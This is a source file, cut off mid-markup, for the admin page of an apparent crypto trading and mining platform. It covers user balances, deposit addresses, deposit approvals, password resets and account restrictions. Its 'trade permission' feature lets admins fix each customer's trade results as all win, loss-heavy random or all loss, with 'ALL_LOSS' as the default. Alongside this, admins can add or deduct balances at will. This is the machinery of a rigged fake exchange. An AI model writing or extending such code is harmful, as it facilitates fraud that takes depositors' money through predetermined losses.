"use client";

import { useCallback, useEffect, useMemo, useState } from "react";
import { useSearchParams } from "next/navigation";
import MiningPendingTable from "../components/MiningPendingTable";
import WithdrawRequestsPanel from "../components/WithdrawRequestsPanel";
import NotifyPanel from "../components/NotifyPanel";
import SupportChatPanel from "../components/SupportChatPanel";

type Asset = "USDT" | "BTC" | "ETH" | "SOL" | "XRP";
type TopupMode = "ADD" | "SUBTRACT";
type TradePermissionMode = "BUY_ALL_WIN" | "SELL_ALL_WIN" | "RANDOM_WIN_LOSS" | "ALL_LOSS";
const ASSETS: Asset[] = ["USDT", "BTC", "ETH", "SOL", "XRP"];

type UserRow = {
  id: string;
  username?: string | null;
  email?: string | null;
  phone?: string | null;
  managed_by?: string | null;
  managed_by_username?: string | null;
  balance?: number | null;
  usdt?: number | null;
  btc?: number | null;
  eth?: number | null;
  sol?: number | null;
  xrp?: number | null;
  created_at?: string | null;
  trade_restricted?: boolean | null;
  mining_restricted?: boolean | null;
  restricted?: boolean | null;
};

type UsersResponse = {
  users?: UserRow[];
  error?: string;
};

type TopupResponse = {
  ok?: boolean;
  error?: string;
  asset?: Asset;
  mode?: TopupMode;
  newUsdtBalance?: number | null;
};

type AddressMap = Record<Asset, string>;

type DepositAddressResponse = {
  ok?: boolean;
  error?: string;
  canEdit?: boolean;
  addresses?: Partial<Record<Asset, string>>;
};

type TradePermissionUser = {
  id: string;
  username?: string | null;
  email?: string | null;
  permissionMode?: TradePermissionMode;
  buyEnabled?: boolean;
  sellEnabled?: boolean;
  source?: "db" | "memory" | "default";
};

type TradePermissionListResponse = {
  users?: TradePermissionUser[];
  error?: string;
};

type TradePermissionUpdateResponse = {
  ok?: boolean;
  error?: string;
  permissionMode?: TradePermissionMode;
  buyEnabled?: boolean;
  sellEnabled?: boolean;
};

type RestrictionUpdateResponse = {
  ok?: boolean;
  error?: string;
  restricted?: boolean;
  tradeRestricted?: boolean;
  miningRestricted?: boolean;
};

type PasswordResetResponse = {
  ok?: boolean;
  error?: string;
  generated?: boolean;
  temporaryPassword?: string | null;
};

type DeleteUserResponse = {
  ok?: boolean;
  error?: string;
  userId?: string;
};

type DepositRequestRow = {
  id: string;
  userId: string;
  adminId?: string | null;
  username?: string | null;
  email?: string | null;
  asset: Asset;
  amount: number;
  walletAddress: string;
  status: "PENDING" | "CONFIRMED" | "REJECTED";
  createdAt: string;
};

type DepositRequestListResponse = {
  ok?: boolean;
  error?: string;
  pendingCount?: number;
  requests?: DepositRequestRow[];
};

type DepositRequestActionResponse = {
  ok?: boolean;
  error?: string;
  pendingCount?: number;
  request?: DepositRequestRow;
};

type UserDetailBalances = {
  usdt: number;
  btc: number;
  eth: number;
  sol: number;
  xrp: number;
};

type UserDetailAccess = {
  tradeRestricted: boolean;
  miningRestricted: boolean;
  restricted: boolean;
};

type UserDetailRow = {
  id: string;
  username?: string | null;
  email?: string | null;
  phone?: string | null;
  createdAt?: string | null;
  managedBy?: string | null;
  managedByUsername?: string | null;
  balances?: UserDetailBalances;
  access?: UserDetailAccess;
};

type UserDetailActivity = {
  id: string;
  source: "BALANCE" | "DEPOSIT" | "WITHDRAW" | "MINING";
  title: string;
  detail: string;
  status: string;
  createdAt: string;
};

type DetailActivityFilter = "ALL" | UserDetailActivity["source"];

type UserDetailsResponse = {
  ok?: boolean;
  error?: string;
  user?: UserDetailRow;
  activities?: UserDetailActivity[];
};

async function readJson<T>(res: Response): Promise<T> {
  try {
    return (await res.json()) as T;
  } catch {
    return {} as T;
  }
}

function fmtDate(v?: string | null) {
  return (v || "").toString().slice(0, 10) || "-";
}

function fmtDateTime(v?: string | null) {
  if (!v) return "-";
  const d = new Date(v);
  if (Number.isNaN(d.getTime())) return "-";
  return d.toLocaleString();
}

function fmtManagedBy(user: UserRow) {
  const id = String(user.managed_by || "");
  const name = String(user.managed_by_username || "").trim();
  if (!id) return "-";
  if (name) return `${name} (${id.slice(0, 8)}...)`;
  return `${id.slice(0, 10)}...`;
}

function fmtAsset(v: number | null | undefined, asset: Asset) {
  const n = Number(v ?? 0);
  const maxFractionDigits = asset === "USDT" ? 2 : 8;
  return n.toLocaleString(undefined, { maximumFractionDigits: maxFractionDigits });
}

function emptyAddressMap(): AddressMap {
  return {
    USDT: "",
    BTC: "",
    ETH: "",
    SOL: "",
    XRP: "",
  };
}

const PERMISSION_MODE_OPTIONS: Array<{ value: TradePermissionMode; label: string }> = [
  { value: "BUY_ALL_WIN", label: "Buy all win" },
  { value: "SELL_ALL_WIN", label: "Sell all win" },
  { value: "RANDOM_WIN_LOSS", label: "All random win/loss" },
  { value: "ALL_LOSS", label: "All loss" },
];

const DETAIL_ACTIVITY_FILTER_OPTIONS: Array<{ value: DetailActivityFilter; label: string }> = [
  { value: "ALL", label: "All" },
  { value: "BALANCE", label: "Balance" },
  { value: "DEPOSIT", label: "Deposit" },
  { value: "WITHDRAW", label: "Withdraw" },
  { value: "MINING", label: "Mining" },
];

function normalizePermissionMode(v: unknown): TradePermissionMode {
  const raw = String(v || "").toUpperCase().trim();
  if (raw === "BUY_ALL_WIN" || raw === "SELL_ALL_WIN" || raw === "RANDOM_WIN_LOSS" || raw === "ALL_LOSS") {
    return raw as TradePermissionMode;
  }
  return "ALL_LOSS";
}

function permissionModeLabel(mode: TradePermissionMode) {
  if (mode === "BUY_ALL_WIN") return "Buy all win";
  if (mode === "SELL_ALL_WIN") return "Sell all win";
  if (mode === "RANDOM_WIN_LOSS") return "All random win/loss";
  return "All loss";
}

function permissionSessionLabel(mode: TradePermissionMode) {
  if (mode === "BUY_ALL_WIN") return "BUY win / SELL loss";
  if (mode === "SELL_ALL_WIN") return "SELL win / BUY loss";
  if (mode === "RANDOM_WIN_LOSS") return "Random (loss-heavy)";
  return "BUY+SELL loss";
}

function activityStatusClass(status: string) {
  const s = status.trim().toUpperCase();
  if (s === "ACTIVE" || s === "CONFIRMED" || s === "DONE" || s === "COMPLETED") {
    return "border-emerald-300/30 bg-emerald-500/10 text-emerald-200";
  }
  if (s === "PENDING") {
    return "border-yellow-300/30 bg-yellow-500/10 text-yellow-200";
  }
  if (s === "REJECTED" || s === "DECLINED" || s === "ABORTED" || s === "FROZEN") {
    return "border-rose-300/30 bg-rose-500/10 text-rose-200";
  }
  return "border-white/20 bg-white/5 text-white/70";
}

export default function AdminPage() {
  const sp = useSearchParams();
  const tab = (sp.get("tab") || "overview").toLowerCase();
  const managedBy = String(sp.get("managedBy") || "ALL").trim() || "ALL";

  const [users, setUsers] = useState<UserRow[]>([]);
  const [loadingUsers, setLoadingUsers] = useState(false);
  const [usersErr, setUsersErr] = useState("");

  const [topupOpen, setTopupOpen] = useState(false);
  const [selectedUser, setSelectedUser] = useState<UserRow | null>(null);
  const [amount, setAmount] = useState("");
  const [asset, setAsset] = useState<Asset>("USDT");
  const [topupMode, setTopupMode] = useState<TopupMode>("ADD");
  const [note, setNote] = useState("");
  const [topupErr, setTopupErr] = useState("");
  const [topupInfo, setTopupInfo] = useState("");
  const [topupLoading, setTopupLoading] = useState(false);
  const [depositAddresses, setDepositAddresses] = useState<AddressMap>(emptyAddressMap());
  const [canEditDepositAddresses, setCanEditDepositAddresses] = useState(false);
  const [depositAddressLoading, setDepositAddressLoading] = useState(false);
  const [depositAddressSaving, setDepositAddressSaving] = useState(false);
  const [depositAddressErr, setDepositAddressErr] = useState("");
  const [depositAddressInfo, setDepositAddressInfo] = useState("");
  const [permissionUsers, setPermissionUsers] = useState<TradePermissionUser[]>([]);
  const [permissionLoading, setPermissionLoading] = useState(false);
  const [permissionErr, setPermissionErr] = useState("");
  const [permissionSavingUserId, setPermissionSavingUserId] = useState("");
  const [restrictionSavingUserId, setRestrictionSavingUserId] = useState("");
  const [restrictionErr, setRestrictionErr] = useState("");
  const [restrictionInfo, setRestrictionInfo] = useState("");
  const [passwordResetSavingUserId, setPasswordResetSavingUserId] = useState("");
  const [passwordResetErr, setPasswordResetErr] = useState("");
  const [passwordResetInfo, setPasswordResetInfo] = useState("");
  const [deleteUserSavingId, setDeleteUserSavingId] = useState("");
  const [deleteUserErr, setDeleteUserErr] = useState("");
  const [deleteUserInfo, setDeleteUserInfo] = useState("");
  const [depositRequests, setDepositRequests] = useState<DepositRequestRow[]>([]);
  const [depositRequestsLoading, setDepositRequestsLoading] = useState(false);
  const [depositRequestsErr, setDepositRequestsErr] = useState("");
  const [depositRequestsInfo, setDepositRequestsInfo] = useState("");
  const [depositRequestActionId, setDepositRequestActionId] = useState("");
  const [pendingDepositCount, setPendingDepositCount] = useState(0);
  const [depositRequestUserFilter, setDepositRequestUserFilter] = useState("ALL");
  const [detailOpen, setDetailOpen] = useState(false);
  const [detailLoading, setDetailLoading] = useState(false);
  const [detailErr, setDetailErr] = useState("");
  const [detailUser, setDetailUser] = useState<UserDetailRow | null>(null);
  const [detailActivities, setDetailActivities] = useState<UserDetailActivity[]>([]);
  const [detailActivityFilter, setDetailActivityFilter] = useState<DetailActivityFilter>("ALL");

  const needUsers = tab === "overview" || tab === "users" || tab === "topups";

  const fetchUsersList = useCallback(async () => {
    const params = new URLSearchParams();
    if (managedBy.toUpperCase() !== "ALL") {
      params.set("managedBy", managedBy);
    }
    const qs = params.toString();

    const r = await fetch(`/api/admin/users${qs ? `?${qs}` : ""}`, {
      method: "GET",
      cache: "no-store",
    });
    const j = await readJson<UsersResponse>(r);
    if (!r.ok) throw new Error(j?.error || "Failed to load users");
    return Array.isArray(j?.users) ? j.users : [];
  }, [managedBy]);

  async function reloadUsers() {
    setLoadingUsers(true);
    setUsersErr("");
    try {
      const rows = await fetchUsersList();
      setUsers(rows);
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Failed to load users";
      setUsersErr(message);
    } finally {
      setLoadingUsers(false);
    }
  }

  const fetchDepositAddresses = useCallback(async () => {
    const r = await fetch("/api/admin/deposit-addresses", {
      method: "GET",
      cache: "no-store",
    });
    const j = await readJson<DepositAddressResponse>(r);
    if (!r.ok || !j?.ok) {
      throw new Error(j?.error || "Failed to load deposit addresses");
    }

    return {
      canEdit: Boolean(j.canEdit),
      addresses: {
        USDT: String(j.addresses?.USDT || ""),
        BTC: String(j.addresses?.BTC || ""),
        ETH: String(j.addresses?.ETH || ""),
        SOL: String(j.addresses?.SOL || ""),
        XRP: String(j.addresses?.XRP || ""),
      } as AddressMap,
    };
  }, []);

  async function reloadDepositAddresses() {
    setDepositAddressLoading(true);
    setDepositAddressErr("");
    try {
      const result = await fetchDepositAddresses();
      setCanEditDepositAddresses(result.canEdit);
      setDepositAddresses(result.addresses);
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Failed to load deposit addresses";
      setDepositAddressErr(message);
    } finally {
      setDepositAddressLoading(false);
    }
  }

  async function saveDepositAddresses() {
    if (!canEditDepositAddresses) {
      setDepositAddressErr("Only primary superadmin can update deposit addresses");
      setDepositAddressInfo("");
      return;
    }

    setDepositAddressSaving(true);
    setDepositAddressErr("");
    setDepositAddressInfo("");
    try {
      const r = await fetch("/api/admin/deposit-addresses", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ addresses: depositAddresses }),
      });
      const j = await readJson<DepositAddressResponse>(r);
      if (!r.ok || !j?.ok) {
        throw new Error(j?.error || "Failed to save deposit addresses");
      }

      setCanEditDepositAddresses(Boolean(j.canEdit));
      setDepositAddresses({
        USDT: String(j.addresses?.USDT || ""),
        BTC: String(j.addresses?.BTC || ""),
        ETH: String(j.addresses?.ETH || ""),
        SOL: String(j.addresses?.SOL || ""),
        XRP: String(j.addresses?.XRP || ""),
      });
      setDepositAddressInfo("Deposit wallet addresses saved");
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Failed to save deposit addresses";
      setDepositAddressErr(message);
    } finally {
      setDepositAddressSaving(false);
    }
  }

  const fetchDepositRequests = useCallback(async (userId?: string) => {
    const params = new URLSearchParams();
    params.set("status", "PENDING");
    params.set("limit", "300");
    if (userId) params.set("userId", userId);
    if (managedBy.toUpperCase() !== "ALL") params.set("managedBy", managedBy);

    const r = await fetch(`/api/admin/deposit-requests?${params.toString()}`, {
      method: "GET",
      cache: "no-store",
    });
    const j = await readJson<DepositRequestListResponse>(r);
    if (!r.ok || !j?.ok) {
      throw new Error(j?.error || "Failed to load deposit requests");
    }

    return {
      requests: Array.isArray(j?.requests) ? j.requests : [],
      pendingCount: Number(j?.pendingCount ?? 0),
    };
  }, [managedBy]);

  async function reloadDepositRequests() {
    setDepositRequestsLoading(true);
    setDepositRequestsErr("");
    try {
      const result = await fetchDepositRequests();
      setDepositRequests(result.requests);
      setPendingDepositCount(result.pendingCount);
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Failed to load deposit requests";
      setDepositRequestsErr(message);
    } finally {
      setDepositRequestsLoading(false);
    }
  }

  async function processDepositRequest(requestId: string, action: "APPROVE" | "DECLINE") {
    setDepositRequestActionId(requestId);
    setDepositRequestsErr("");
    setDepositRequestsInfo("");
    try {
      const r = await fetch("/api/admin/deposit-requests", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId, action }),
      });

      const j = await readJson<DepositRequestActionResponse>(r);
      if (!r.ok || !j?.ok) {
        throw new Error(j?.error || `Failed to ${action.toLowerCase()} request`);
      }

      setDepositRequests((prev) => prev.filter((x) => x.id !== requestId));
      setPendingDepositCount(Number(j?.pendingCount ?? 0));
      setDepositRequestsInfo(
        action === "APPROVE" ? "Deposit request approved and credited." : "Deposit request declined."
      );

      await reloadUsers();
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : `Failed to ${action.toLowerCase()} request`;
      setDepositRequestsErr(message);
    } finally {
      setDepositRequestActionId("");
    }
  }

  const fetchPermissionUsers = useCallback(async () => {
    const params = new URLSearchParams();
    if (managedBy.toUpperCase() !== "ALL") {
      params.set("managedBy", managedBy);
    }
    const qs = params.toString();
    const r = await fetch(`/api/admin/trade-permission${qs ? `?${qs}` : ""}`, {
      method: "GET",
      cache: "no-store",
    });
    const j = await readJson<TradePermissionListResponse>(r);
    if (!r.ok) throw new Error(j?.error || "Failed to load trade permissions");
    const rows = Array.isArray(j?.users) ? j.users : [];
    return rows.map((u) => ({
      ...u,
      permissionMode: normalizePermissionMode(u.permissionMode),
    }));
  }, [managedBy]);

  async function reloadPermissionUsers() {
    setPermissionLoading(true);
    setPermissionErr("");
    try {
      const rows = await fetchPermissionUsers();
      setPermissionUsers(rows);
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Failed to load trade permissions";
      setPermissionErr(message);
    } finally {
      setPermissionLoading(false);
    }
  }

  async function savePermission(userId: string, permissionMode: TradePermissionMode) {
    setPermissionSavingUserId(userId);
    setPermissionErr("");
    try {
      const r = await fetch("/api/admin/trade-permission", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId, permissionMode }),
      });
      const j = await readJson<TradePermissionUpdateResponse>(r);
      if (!r.ok || !j?.ok) {
        throw new Error(j?.error || "Failed to save permission");
      }
      const savedMode = normalizePermissionMode(j?.permissionMode || permissionMode);
      setPermissionUsers((prev) =>
        prev.map((u) =>
          u.id === userId
            ? {
                ...u,
                permissionMode: savedMode,
              }
            : u
        )
      );
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Failed to save permission";
      setPermissionErr(message);
    } finally {
      setPermissionSavingUserId("");
    }
  }

  useEffect(() => {
    if (!needUsers) return;

    let cancelled = false;

    const run = async () => {
      setLoadingUsers(true);
      setUsersErr("");
      try {
        const rows = await fetchUsersList();
        if (!cancelled) setUsers(rows);
      } catch (e: unknown) {
        if (cancelled) return;
        const message = e instanceof Error ? e.message : "Failed to load users";
        setUsersErr(message);
      } finally {
        if (!cancelled) setLoadingUsers(false);
      }
    };

    void run();
    return () => {
      cancelled = true;
    };
  }, [needUsers, fetchUsersList]);

  useEffect(() => {
    if (tab !== "orders") return;

    let cancelled = false;

    const run = async () => {
      setPermissionLoading(true);
      setPermissionErr("");
      try {
        const rows = await fetchPermissionUsers();
        if (!cancelled) setPermissionUsers(rows);
      } catch (e: unknown) {
        if (cancelled) return;
        const message = e instanceof Error ? e.message : "Failed to load trade permissions";
        setPermissionErr(message);
      } finally {
        if (!cancelled) setPermissionLoading(false);
      }
    };

    void run();
    return () => {
      cancelled = true;
    };
  }, [tab, fetchPermissionUsers]);

  useEffect(() => {
    if (tab !== "topups") return;

    let cancelled = false;

    const run = async () => {
      setDepositAddressLoading(true);
      setDepositRequestsLoading(true);
      setDepositAddressErr("");
      setDepositRequestsErr("");
      try {
        const [addressResult, depositResult] = await Promise.all([
          fetchDepositAddresses(),
          fetchDepositRequests(),
        ]);
        if (!cancelled) {
          setCanEditDepositAddresses(addressResult.canEdit);
          setDepositAddresses(addressResult.addresses);
          setDepositRequests(depositResult.requests);
          setPendingDepositCount(depositResult.pendingCount);
        }
      } catch (e: unknown) {
        if (cancelled) return;
        const message = e instanceof Error ? e.message : "Failed to load deposit addresses";
        setDepositAddressErr(message);
        setDepositRequestsErr(message);
      } finally {
        if (!cancelled) {
          setDepositAddressLoading(false);
          setDepositRequestsLoading(false);
        }
      }
    };

    void run();
    return () => {
      cancelled = true;
    };
  }, [tab, fetchDepositRequests, fetchDepositAddresses]);

  const usersForTable = useMemo(() => users, [users]);
  const pendingByUserId = useMemo(() => {
    const map = new Map<string, number>();
    depositRequests.forEach((r) => {
      const key = String(r.userId || "");
      if (!key) return;
      map.set(key, (map.get(key) ?? 0) + 1);
    });
    return map;
  }, [depositRequests]);
  const requestUserOptions = useMemo(() => {
    const seen = new Set<string>();
    const rows: Array<{ id: string; label: string }> = [];

    depositRequests.forEach((r) => {
      const id = String(r.userId || "").trim();
      if (!id || seen.has(id)) return;
      seen.add(id);
      const matched = usersForTable.find((u) => u.id === id);
      const username = String(r.username || matched?.username || id.slice(0, 8));
      const email = String(r.email || matched?.email || "").trim();
      rows.push({
        id,
        label: email ? `${username} (${email})` : username,
      });
    });

    return rows;
  }, [depositRequests, usersForTable]);
  const filteredDepositRequests = useMemo(() => {
    if (depositRequestUserFilter === "ALL") return depositRequests;
    return depositRequests.filter((r) => r.userId === depositRequestUserFilter);
  }, [depositRequestUserFilter, depositRequests]);

  useEffect(() => {
    if (depositRequestUserFilter === "ALL") return;
    const stillExists = depositRequests.some((r) => r.userId === depositRequestUserFilter);
    if (!stillExists) {
      setDepositRequestUserFilter("ALL");
    }
  }, [depositRequestUserFilter, depositRequests]);

  const openTopup = (u: UserRow) => {
    setSelectedUser(u);
    setAmount("");
    setAsset("USDT");
    setTopupMode("ADD");
    setNote("");
    setTopupErr("");
    setTopupInfo("");
    setDepositRequestsErr("");
    setDepositRequestsInfo("");
    setTopupOpen(true);
  };

  const closeTopup = () => {
    setTopupOpen(false);
    setSelectedUser(null);
    setAmount("");
    setTopupMode("ADD");
    setNote("");
    setTopupErr("");
  };

  const filteredDetailActivities = useMemo(() => {
    if (detailActivityFilter === "ALL") return detailActivities;
    return detailActivities.filter((item) => item.source === detailActivityFilter);
  }, [detailActivities, detailActivityFilter]);

  const closeDetail = () => {
    setDetailOpen(false);
    setDetailErr("");
    setDeleteUserErr("");
    setDetailLoading(false);
    setDetailUser(null);
    setDetailActivities([]);
    setDetailActivityFilter("ALL");
  };

  const openDetail = async (u: UserRow) => {
    setDetailOpen(true);
    setDetailLoading(true);
    setDetailErr("");
    setDeleteUserErr("");
    setDetailActivityFilter("ALL");
    setDetailUser({
      id: u.id,
      username: u.username ?? null,
      email: u.email ?? null,
      phone: u.phone ?? null,
      createdAt: u.created_at ?? null,
      managedBy: u.managed_by ?? null,
      managedByUsername: u.managed_by_username ?? null,
      balances: {
        usdt: Number(u.usdt ?? u.balance ?? 0),
        btc: Number(u.btc ?? 0),
        eth: Number(u.eth ?? 0),
        sol: Number(u.sol ?? 0),
        xrp: Number(u.xrp ?? 0),
      },
      access: {
        tradeRestricted: Boolean(u.trade_restricted),
        miningRestricted: Boolean(u.mining_restricted),
        restricted: Boolean(u.restricted || u.trade_restricted || u.mining_restricted),
      },
    });
    setDetailActivities([]);

    try {
      const params = new URLSearchParams();
      params.set("userId", u.id);
      params.set("limit", "20");
      const r = await fetch(`/api/admin/user-details?${params.toString()}`, {
        cache: "no-store",
      });
      const j = await readJson<UserDetailsResponse>(r);
      if (!r.ok || !j?.ok) {
        throw new Error(j?.error || "Failed to load user details");
      }

      setDetailUser(j.user ?? null);
      setDetailActivities(Array.isArray(j.activities) ? j.activities : []);
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Failed to load user details";
      setDetailErr(message);
    } finally {
      setDetailLoading(false);
    }
  };

  const isUserRestricted = (u: UserRow) =>
    Boolean(u.restricted || u.trade_restricted || u.mining_restricted);

  const toggleUserRestriction = async (u: UserRow) => {
    const nextRestricted = !isUserRestricted(u);

    setRestrictionSavingUserId(u.id);
    setRestrictionErr("");
    setRestrictionInfo("");

    try {
      const r = await fetch("/api/admin/user-restrictions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: u.id,
          restricted: nextRestricted,
        }),
      });

      const j = await readJson<RestrictionUpdateResponse>(r);
      if (!r.ok || !j?.ok) {
        throw new Error(j?.error || "Failed to update restriction");
      }

      setUsers((prev) =>
        prev.map((row) =>
          row.id === u.id
            ? {
                ...row,
                restricted: Boolean(j.restricted),
                trade_restricted: Boolean(j.tradeRestricted),
                mining_restricted: Boolean(j.miningRestricted),
              }
            : row
        )
      );

      setRestrictionInfo(
        nextRestricted
          ? `${u.username ?? u.email ?? "User"} is now restricted (trade/mining disabled).`
          : `${u.username ?? u.email ?? "User"} is now un-restricted.`
      );
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Failed to update restriction";
      setRestrictionErr(message);
    } finally {
      setRestrictionSavingUserId("");
    }
  };

  const resetUserPassword = async (u: UserRow) => {
    const input = window.prompt(
      "Set new password. Leave blank and press OK to auto-generate a temporary password (min 8 chars).",
      ""
    );
    if (input === null) return;

    const nextPassword = String(input || "").trim();
    if (nextPassword.length > 0 && nextPassword.length < 8) {
      setPasswordResetErr("New password must be at least 8 characters.");
      setPasswordResetInfo("");
      return;
    }

    setPasswordResetSavingUserId(u.id);
    setPasswordResetErr("");
    setPasswordResetInfo("");

    try {
      const r = await fetch("/api/admin/reset-user-password", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: u.id,
          newPassword: nextPassword || undefined,
        }),
      });

      const j = await readJson<PasswordResetResponse>(r);
      if (!r.ok || !j?.ok) {
        throw new Error(j?.error || "Failed to reset password");
      }

      const label = u.username ?? u.email ?? "User";
      if (j.generated && j.temporaryPassword) {
        setPasswordResetInfo(`Temporary password for ${label}: ${j.temporaryPassword}`);
      } else {
        setPasswordResetInfo(`Password reset completed for ${label}.`);
      }
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Failed to reset password";
      setPasswordResetErr(message);
    } finally {
      setPasswordResetSavingUserId("");
    }
  };

  const deleteCustomerAccount = async () => {
    const target = detailUser;
    if (!target?.id) return;

    const label = target.username ?? target.email ?? "this customer";
    const confirmed = window.confirm(`Delete ${label} account? This action cannot be undone.`);
    if (!confirmed) return;

    setDeleteUserSavingId(target.id);
    setDeleteUserErr("");
    setDeleteUserInfo("");

    try {
      const r = await fetch("/api/admin/delete-user", {
        method: "POST",
        credentials: "include",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ userId: target.id }),
      });

      const j = await readJson<DeleteUserResponse>(r);
      if (!r.ok || !j?.ok) {
        throw new Error(j?.error || "Failed to delete customer account");
      }

      setUsers((prev) => prev.filter((row) => row.id !== target.id));
      setPermissionUsers((prev) => prev.filter((row) => row.id !== target.id));
      setDepositRequests((prev) => {
        const next = prev.filter((row) => row.userId !== target.id);
        setPendingDepositCount(next.length);
        return next;
      });

      if (selectedUser?.id === target.id) {
        closeTopup();
      }

      closeDetail();
      setDeleteUserInfo(`${label} account deleted.`);
      void reloadUsers();
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Failed to delete customer account";
      setDeleteUserErr(message);
    } finally {
      setDeleteUserSavingId("");
    }
  };

  const confirmTopup = async () => {
    if (!selectedUser) return;

    const n = Number(amount);
    if (!Number.isFinite(n) || n <= 0) {
      setTopupErr("Amount must be greater than 0");
      return;
    }

    setTopupLoading(true);
    setTopupErr("");
    setTopupInfo("");

    try {
      const r = await fetch("/api/admin/topup", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          userId: selectedUser.id,
          amount: n,
          asset,
          mode: topupMode,
          note: note || null,
        }),
      });

      const j = await readJson<TopupResponse>(r);
      if (!r.ok || !j?.ok) {
        throw new Error(j?.error || "Topup failed");
      }

      if (asset === "USDT" && typeof j.newUsdtBalance === "number") {
        setUsers((prev) =>
          prev.map((u) =>
            u.id === selectedUser.id
              ? {
                  ...u,
                  balance: Number(j.newUsdtBalance),
                  usdt: Number(j.newUsdtBalance),
                }
              : u
          )
        );
      }

      setTopupInfo(
        topupMode === "SUBTRACT"
          ? asset === "USDT"
            ? "Deduct success (USDT balance updated)"
            : `Deduct success (${asset})`
          : asset === "USDT"
            ? "Topup success (USDT balance updated)"
            : `Topup success (${asset})`
      );

      closeTopup();
      await reloadUsers();
    } catch (e: unknown) {
      const message = e instanceof Error ? e.message : "Topup failed";
      setTopupErr(message);
    } finally {
      setTopupLoading(false);
    }
  };

  if (tab === "overview") {
    return (
      <div className="rounded-3xl border border-white/10 bg-white/5 p-6">
        <div className="mb-4 flex items-center justify-between gap-2">
          <div>
            <div className="text-xl font-semibold">Overview</div>
            <div className="mt-1 text-sm text-white/60">
              User balances, emails, managed-by and account creation time.
            </div>
          </div>
          <button
            type="button"
            onClick={() => void reloadUsers()}
            className="rounded-xl border border-white/10 bg-white/5 px-4 py-2 text-sm hover:bg-white/10"
          >
            Refresh
          </button>
        </div>

        {loadingUsers ? <div className="text-white/60">Loading...</div> : null}
        {usersErr ? <div className="text-red-400">{usersErr}</div> : null}

        {!loadingUsers && !usersErr ? (
          <div className="overflow-x-auto rounded-xl border border-white/10">
            <table className="w-full min-w-[980px]">
              <thead className="bg-white/5 text-left text-white/60">
                <tr>
                  <th className="px-3 py-3">USER</th>
                  <th className="px-3 py-3">EMAIL</th>
                  <th className="px-3 py-3 text-right">BALANCE (USDT)</th>
                  <th className="px-3 py-3">MANAGED BY</th>
                  <th className="px-3 py-3">CREATED AT</th>
                </tr>
              </thead>
              <tbody>
                {usersForTable.map((u) => (
                  <tr key={u.id} className="border-t border-white/10">
                    <td className="px-3 py-3">{u.username ?? "-"}</td>
                    <td className="px-3 py-3">{u.email ?? "-"}</td>
                    <td className="px-3 py-3 text-right">{fmtAsset(u.usdt ?? u.balance, "USDT")}</td>
                    <td className="px-3 py-3">{fmtManagedBy(u)}</td>
                    <td className="px-3 py-3">{fmtDateTime(u.created_at)}</td>
                  </tr>
                ))}
                {usersForTable.length === 0 ? (
                  <tr>
                    <td className="px-3 py-6 text-white/60" colSpan={5}>
                      No users found.
                    </td>
                  </tr>
                ) : null}
              </tbody>
            </table>
          </div>
        ) : null}
      </div>
    );
  }

  if (tab === "users") {
    return (
      <div className="rounded-3xl border border-white/10 bg-white/5 p-6">
        <div className="mb-4 text-xl font-semibold">Users</div>

        {loadingUsers ? <div className="text-white/60">Loading...</div> : null}
        {usersErr ? <div className="text-red-400">{usersErr}</div> : null}
        {restrictionErr ? <div className="mb-3 text-sm text-red-300">{restrictionErr}</div> : null}
        {restrictionInfo ? <div className="mb-3 text-sm text-emerald-300">{restrictionInfo}</div> : null}
        {passwordResetErr ? <div className="mb-3 text-sm text-red-300">{passwordResetErr}</div> : null}
        {passwordResetInfo ? <div className="mb-3 text-sm text-emerald-300">{passwordResetInfo}</div> : null}
        {deleteUserErr ? <div className="mb-3 text-sm text-red-300">{deleteUserErr}</div> : null}
        {deleteUserInfo ? <div className="mb-3 text-sm text-emerald-300">{deleteUserInfo}</div> : null}

        {!loadingUsers && !usersErr && (
          <div className="overflow-x-auto">
            <table className="w-full min-w-[940px]">
              <thead>
                <tr className="text-left text-white/60">
                  <th className="py-3">USERNAME</th>
                  <th className="py-3">EMAIL</th>
                  <th className="py-3 text-right">BALANCE</th>
                  <th className="py-3 text-center">ACCESS</th>
                  <th className="py-3 text-right">CREATED</th>
                  <th className="py-3 text-right">ACTION</th>
                </tr>
              </thead>
              <tbody>
                {usersForTable.map((u) => {
                  const restricted = isUserRestricted(u);
                  const isSaving = restrictionSavingUserId === u.id;
                  const isResetting = passwordResetSavingUserId === u.id;
                  const isDeleting = deleteUserSavingId === u.id;

                  return (
                    <tr key={u.id} className="border-t border-white/10">
                      <td className="py-3">{u.username ?? "-"}</td>
                      <td className="py-3">{u.email ?? "-"}</td>
                      <td className="py-3 text-right">{fmtAsset(u.usdt ?? u.balance, "USDT")}</td>
                      <td className="py-3 text-center">
                        <span
                          className={
                            "inline-flex rounded-full border px-3 py-1 text-xs font-semibold " +
                            (restricted
                              ? "border-rose-300/30 bg-rose-500/10 text-rose-200"
                              : "border-emerald-300/30 bg-emerald-500/10 text-emerald-200")
                          }
                        >
                          {restricted ? "Restricted" : "Active"}
                        </span>
                      </td>
                      <td className="py-3 text-right">{fmtDate(u.created_at)}</td>
                      <td className="py-3 pr-1 text-right">
                        <div className="inline-flex max-w-[280px] flex-wrap justify-end gap-2">
                          <button
                            type="button"
                            onClick={() => void openDetail(u)}
                            disabled={isSaving || isResetting || isDeleting}
                            className="rounded-full border border-white/20 bg-white/5 px-3 py-2 text-xs font-semibold text-white whitespace-nowrap disabled:opacity-60 hover:bg-white/10"
                          >
                            Details
                          </button>
                          <button
                            type="button"
                            onClick={() => void resetUserPassword(u)}
